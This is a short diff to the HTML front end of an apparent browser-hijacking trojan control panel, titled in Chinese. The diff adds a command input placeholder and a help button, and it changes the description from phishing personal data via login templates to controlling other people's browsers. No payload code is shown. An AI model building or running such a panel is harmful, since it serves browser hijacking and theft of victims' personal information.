@@ -26,13 +26,14 @@ button:hover {
     </head>
     <body style="padding: 50px;" id="body">
         <h2 style="color: green;">浏览器控制木马攻击</h2>
-        <input id="in_command" style="width: 100%;height: 30px;background-color: black;border: 1px solid green;color: green;outline: none;" />
+        <input placeholder="输入控制指令，按下Enter发送" id="in_command" style="width: 100%;height: 30px;background-color: black;border: 1px solid green;color: green;outline: none;" />
         <br />
         <br />
-        <div id="console" style="color: green;width: 100%;height: 300px;overflow-y: scroll;background-color: black;border: 1px solid green;;"></div>
+        <div id="console" style="padding: 5px;color: green;width: 100%;height: 300px;overflow-y: scroll;background-color: black;border: 1px solid green;;"></div>
+        <button onclick="window.open('help.html')">帮助</button>
         <p>
             描述:<br />
-            利用各个平台的登录模版，来钓鱼获取个人信息
+            利用浏览器控制木马，操控别人的浏览器.
         </p>
     </body>
 </html>
